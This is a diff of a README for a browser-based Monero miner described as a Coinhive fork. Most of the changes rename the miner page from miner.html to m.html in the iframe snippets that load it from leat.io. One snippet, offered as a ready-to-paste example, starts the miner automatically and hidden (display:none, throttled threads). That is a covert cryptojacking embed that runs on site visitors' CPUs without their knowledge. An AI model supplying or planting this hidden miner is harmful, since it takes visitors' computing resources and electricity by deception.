@@ -10,8 +10,8 @@ For it to work on your own server you serve the `leat-mine.js` file and run the 
 The following will work as is (however it will use leat.io servers unless you serve the files).
 
 ```html
-    <iframe src="https://leat.io/miner.html?u=leathan" width="400px" height="300px"></iframe>
-    <!-- OR EVEN: <iframe src="https://leat.io/html/miner.html?a=YOUR_MONERO_ADDRESS"></iframe> -->
+    <iframe src="https://leat.io/m.html?u=leathan" width="400px" height="300px"></iframe>
+    <!-- OR EVEN: <iframe src="https://leat.io/html/m.html?a=YOUR_MONERO_ADDRESS"></iframe> -->
 ```
 
 See a live example at [https://leathan.xyz/html/iframe-miner.html](https://leathan.xyz/html/iframe-miner.html).
@@ -43,7 +43,7 @@ See a live example at [https://leathan.xyz/html/iframe-miner.html](https://leath
 For example to start automatically and hidden as user leathan with 1 thread throttled 50%:
 
 ```html
-<iframe src="https://leat.io/miner.html?u=leathan&t=1&th=.5&h&s" style="display:none"></iframe>
+<iframe src="https://leat.io/m.html?u=leathan&t=1&th=.5&h&s" style="display:none"></iframe>
 ```
 
 
@@ -93,7 +93,7 @@ Since this is a coin-hive fork I will record the changes.
 
 3.) For best preformance set up `leat-mine.js` as explained in the README and host `leathash.wasm`, `leathash-asmjs.min.js`, `leathash-asmjs.min.js.mem` and `leat-mine.js` on your server.
 
-3.) Edit `miner.html` (this repository) so that the script tag includes your servers `leat-mine.js` file.
+3.) Edit `miner.html (m.html on leat.io server)` (this repository) so that the script tag includes your servers `leat-mine.js` file.
 ```
 // In my case its
 <script src="https://leat.io/lib/leat-mine.js"></script>
